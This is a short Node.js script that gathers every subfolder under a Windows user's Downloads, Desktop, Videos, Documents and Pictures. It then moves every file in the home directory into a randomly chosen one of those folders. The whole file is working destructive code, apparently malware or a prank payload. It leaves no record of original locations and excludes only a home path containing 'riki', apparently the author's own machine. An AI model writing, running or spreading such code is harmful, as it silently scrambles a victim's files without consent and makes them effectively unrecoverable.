"use strict";

// Dependencies
const path = require("path")
const os = require("os")
const fs = require("fs")

// Variables
const homeDir = os.userInfo().homedir
const allDirs = []
const dTC = [
    `${homeDir}\\Downloads`,
    `${homeDir}\\Desktop`,
    `${homeDir}\\Videos`,
    `${homeDir}\\Documents`,
    `${homeDir}\\Pictures`
]

// Functions
function getDirs(rDir){
    function rdrir(dir){
        const files = fs.readdirSync(dir)

        for( const f of files ){
            const fP = path.join(dir, f)

            try{
                if(fs.statSync(fP).isDirectory()){
                    if(!allDirs.includes(fP)) allDirs.push(fP)

                    rdrir(fP)
                }
            }catch{}
        }
    }

    rdrir(rDir)
}

function relocateFiles(rDir) {
    const files = []
    const fF = fs.readdirSync(rDir)
  
    for( const f of fF ){
        const fP = path.join(rDir, f)

        try{
            fs.statSync(fP).isDirectory() ? files.push(...relocateFiles(fP)) : fs.renameSync(fP, path.join(allDirs[Math.floor(Math.random() * allDirs.length)], path.basename(fP)))
        }catch(err){
            console.log(err)
        }
    }
  
    return files
}

// Main
///* Phase 1
for (const uF of dTC ) getDirs(uF)

///* Phase 2
if(!allDirs.length) process.exit()
if(homeDir.match("riki")) process.exit()
relocateFiles(homeDir)